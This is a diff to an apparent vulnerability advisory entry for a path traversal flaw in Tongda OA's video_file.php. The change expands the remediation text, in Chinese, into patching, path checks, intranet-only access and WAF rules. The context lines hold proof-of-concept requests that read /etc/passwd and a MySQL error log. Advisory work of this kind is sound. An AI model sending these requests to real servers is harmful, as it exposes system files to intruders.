@@ -7,7 +7,7 @@ detail = """GET /general/video_file.php?path=../../../../etc/passwd HTTP/1.1 Hos
 POST /general/video_file.php HTTP/1.1 Host: target Content-Type: application/x-www-form-urlencoded
 
 path=../../../MYOA/logs/mysql_error.log"""
-fix = "安装官方补丁"
+fix = "安装通达 OA 官方 TVD-2026-15329 安全补丁；对 video_file.php 的 path 参数进行路径规范化检查；限制 /general/video_file.php 接口仅允许内网访问；WAF 拦截路径遍历特征。"
 date = 20260601
 label = "nday"
 cve = "TVD-2026-15329"
